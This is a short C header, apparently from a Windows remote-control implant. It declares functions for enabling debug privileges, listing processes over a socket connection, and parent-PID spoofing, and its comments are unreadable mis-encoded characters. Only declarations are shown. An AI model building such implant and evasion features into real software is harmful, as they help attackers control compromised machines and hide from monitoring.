#pragma once
#include "command.h"
#include <sddl.h>
#include <WtsApi32.h>

#pragma comment(lib,"Wtsapi32.lib")

/**
 *
 * ������صĲ���
 * ��
 * 2022/3/9
 *
**/

// ���õ���Ȩ��
void EnableDebugAbility();
// ��ȡ����\�û���
void GetAccount(PSID userSid,char buffer[]);
// ��ȡ�����б�ָ��
PWTS_PROCESS_INFO_EX GetProcessList(DWORD* processCnt);
// ��ȡָ��PID���̵�λ�� 0:��ȡʧ�� 32:32λ���� 64:64λ����
int GetProcessPlatform(DWORD dwProcessID);
// �鿴������Ϣ����
BOOL PS(SOCKET sServer, char cmd[]);
// ��������ƭ
BOOL PPIDSpoofing(SOCKET sServer,DWORD pid);